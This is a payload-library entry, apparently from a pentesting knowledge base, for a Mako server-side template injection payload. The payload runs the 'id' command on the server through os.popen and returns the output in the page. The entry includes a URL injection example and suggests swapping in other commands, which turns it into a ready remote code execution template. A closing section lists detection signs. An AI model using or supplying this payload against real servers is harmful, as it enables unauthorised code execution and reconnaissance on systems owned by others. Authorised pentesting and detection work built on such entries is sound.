---
id: 9b0f936e-78db-4177-9332-e8c7c48bb403
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:40.070726+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - SSTI
  - Mako
  - RCE
  - payload
platforms:
  - Web
  - Linux
  - Python
validated: true
---

# Mako-Template-User-ID-Exfiltration

## Code

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

## Description

This Mako template payload exploits Server-Side Template Injection (SSTI) to execute arbitrary Python code on the server. It imports the 'os' module, runs the Unix 'id' command to retrieve the current user's UID, GID, and group memberships, stores the output in variable 'x', and substitutes it into the template response using ${x}. This allows attackers to exfiltrate system user information without direct shell access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This payload has no customizable variables; it executes a fixed 'id' command. Modify 'os.popen('id')' for other commands if needed. | N/A |

## Usage

Inject this payload into a vulnerable Mako template parameter, such as a search query (?q=) or form input that is unsafely rendered in the template. For example, in a URL: /search?q=<% import os; x=os.popen('id').read() %>${x}. The server evaluates the template, executes the code, and returns the 'id' output in the HTML response. Use in web pentesting to enumerate server context after confirming SSTI.

## Detection

- Web application logs showing template evaluation errors or unexpected os/exec traces.
- WAF alerts for SSTI signatures like '<%', 'os.popen', or '${' in inputs.
- Response analysis revealing command outputs (e.g., 'uid=33(www-data)') in rendered pages.
- Runtime monitoring for Python processes spawning shell commands from web contexts.

## Related

- [[procedures/Mako-SSTI-to-Retrieve-Current-User-ID]]
